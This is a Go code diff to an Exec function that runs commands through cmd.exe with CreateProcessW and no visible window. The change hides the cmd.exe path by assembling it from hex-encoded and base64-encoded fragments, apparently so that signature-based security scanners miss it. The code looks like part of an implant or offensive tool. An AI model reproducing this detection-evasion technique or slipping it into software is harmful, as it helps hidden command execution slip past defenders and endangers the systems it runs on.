@@ -5,6 +5,8 @@ import (
 	"fmt"
 	"syscall"
 	"unsafe"
+	"encoding/hex"
+	"encoding/base64"
 )
 
 func Exec(command string) (bytes.Buffer,error){
@@ -36,7 +38,12 @@ func Exec(command string) (bytes.Buffer,error){
 		return bytes.Buffer{},err
 	}
 
-	appName, _ := syscall.UTF16PtrFromString("C:\\Windows\\System32\\cmd.exe")
+	str1:="C:\\Windows"
+	str2,_:=hex.DecodeString("5c5c53797374656d33325c5c")
+	str3,_:=base64.StdEncoding.DecodeString("Y21kLmV4ZQ==")
+
+
+	appName, _ := syscall.UTF16PtrFromString(str1+string(str2)+string(str3))
 	
 	success, err := CreateProcessW(appName, cmdLine, nil, nil, true, CREATE_NO_WINDOW, nil, nil, &startupInfo, &procInfo)
 	if !success || err != nil {
